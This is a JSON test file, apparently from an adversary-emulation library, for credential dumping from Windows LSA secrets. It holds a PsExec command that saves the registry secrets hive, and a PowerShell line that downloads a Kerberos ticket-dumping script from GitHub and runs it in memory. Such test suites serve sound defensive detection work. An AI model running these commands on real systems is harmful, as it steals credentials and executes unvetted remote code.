{
  "attack_technique": "T1003.004",
  "display_name": "OS Credential Dumping: LSA Secrets",
  "atomic_tests": [
    {
      "name": "Dumping LSA Secrets",
      "description": "Dump secrets key from Windows registry\nWhen successful, the dumped file will be written to $env:Temp\\secrets.\nAttackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.\nhttps://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "del %temp%\\secrets >nul 2> nul",
        "procedure": "\"#{psexec_exe}\" -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y"
      },
      "input_arguments": [
        {
          "arg_name": "psexec_exe",
          "description": "Path to PsExec executable",
          "type": "path",
          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1003.004\\bin\\PsExec.exe"
        }
      ],
      "dependencies": [
        {
          "description": "PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})",
          "prereq_command": "if (Test-Path \"#{psexec_exe}\") {exit 0} else {exit 1}",
          "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\\PsExec.exe\" \"#{psexec_exe}\" -Force"
        }
      ],
      "dependency_executor_name": "powershell",
      "auto_generated_guid": "55295ab0-a703-433b-9ca4-ae13807de12f"
    },
    {
      "name": "Dump Kerberos Tickets from LSA using dumper.ps1",
      "description": "This tool allows you to dump Kerberos tickets from the LSA cache. Implemented via Add-Type.\nIf the tool is run as a privileged user, it will automatically obtain NT AUTHORITY\\SYSTEM privileges and then dump all tickets. If the tool is run as a non-privileged user, it will only dump tickets from the current logon session.\nRef: https://github.com/MzHmO/PowershellKerberos/\nAuthor of dumper.ps1: Michael Zhmaylo (@MzHmO)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')"
      },
      "input_arguments": [],
      "auto_generated_guid": "2dfa3bff-9a27-46db-ab75-7faefdaca732"
    }
  ]
}